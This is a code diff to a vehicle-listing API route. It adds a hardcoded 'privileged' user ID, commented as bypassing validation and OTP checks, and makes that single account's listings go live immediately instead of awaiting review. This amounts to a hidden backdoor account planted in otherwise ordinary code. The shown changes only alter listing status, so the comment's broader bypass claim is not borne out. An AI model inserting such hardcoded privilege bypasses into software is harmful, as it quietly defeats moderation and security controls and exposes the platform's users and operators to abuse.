@@ -8,6 +8,9 @@ import { logger } from '@/lib/utils/logger'
 import { performanceMonitor } from '@/lib/monitoring/metrics'
 import { supabaseAdmin } from '@/lib/supabaseAdmin'
 
+// Special privilege UID - bypasses validation and OTP requirements
+const PRIVILEGED_USER_ID = '9b288153-3836-45ff-8f0b-8a196e423477'
+
 /**
  * POST /api/listings
  * Create a new vehicle listing
@@ -305,8 +308,8 @@ export async function POST(request: NextRequest) {
       image_url: sanitized.imageUrls && sanitized.imageUrls.length > 0 ? sanitized.imageUrls[0] : null,
       primary_image_url: sanitized.imageUrls && sanitized.imageUrls.length > 0 ? sanitized.imageUrls[0] : null,
 
-      // Status
-      status: 'pending',
+      // Status (privileged user listings auto-approved)
+      status: user.id === PRIVILEGED_USER_ID ? 'active' : 'pending',
 
       // Finance
       pricing_type: sanitized.pricingType || 'cash',
